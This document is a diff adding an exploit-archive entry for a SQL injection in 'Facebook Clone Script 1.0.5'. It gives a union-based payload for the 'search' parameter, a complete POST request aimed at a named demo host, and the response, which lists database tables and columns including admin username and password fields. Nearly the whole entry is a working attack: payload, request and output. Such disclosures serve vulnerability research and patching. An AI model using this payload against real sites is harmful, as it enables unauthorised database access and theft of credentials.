@@ -1,0 +1,46 @@
+# Exploit Title: Facebook Clone Script 1.0.5 - 'search' SQL Injection
+# Date: 2018-05-29
+# Exploit Author: L0RD
+# Vendor Homepage: https://www.phpscriptsmall.com/product/facebook-clone/
+# Version: 1.0.5
+# Tested on: Win 10
+
+# POC : SQLi :
+
+# Parameter : search
+# Type : Union based
+# Payload : 
+1' UNION SELECT NULL,group_concat(table_name,0x3a,column_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+from information_schema.columns where table_schema=schema()#
+
+# Request
+
+POST /demo/fbclone/top-search.php HTTP/1.1
+Host: smsemailmarketing.in
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
+Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://smsemailmarketing.in/demo/fbclone/setting.php
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 231
+Connection: keep-alive
+
+search=1' UNION SELECT NULL,group_concat(table_name,0x3C62723E,column_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+from information_schema.columns where table_schema=schema()#
+
+# Response
+
+HTTP/1.1 200 OK
+Server: nginx/1.12.2
+Date: Tue, 29 May 2018 17:12:31 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Content-Length: 5370
+
+<a href='friend-profile.php?id='><img  src="images/unknown.jpeg"
+height="40px"
+width="40px">About_you:a_id,about_you:u_id,about_you:u_nick,about_you:u_nickname,about_you:u_nick_show,about_you:nick_privacy,admin:id,admin:name,admin:username,admin:password,admin:ref_password,admin:sex,admin:email_id,admin:valid_id,admin:user_type,admin:user_level,admin:city_code,admin:state_code,admin:country_code,admin:userimages,admin:description
+</a></div>
